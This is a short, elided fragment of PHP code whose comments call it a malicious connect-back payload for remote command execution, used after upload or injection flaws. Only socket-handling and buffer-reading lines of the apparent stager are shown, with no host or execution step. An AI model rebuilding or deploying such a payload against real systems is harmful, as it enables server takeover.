#A malicious payload that connects back to an attacker's server and executes arbitrary commands on the victim's machine.
#It is used in attacks after exploiting upload vulnerabilities or code injection.
                  ...
                  switch ($s_type) { 
                    ...
                    while (strlen($b) < $len) { 
                      switch ($s_type) { 
                        ...
                        break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; 
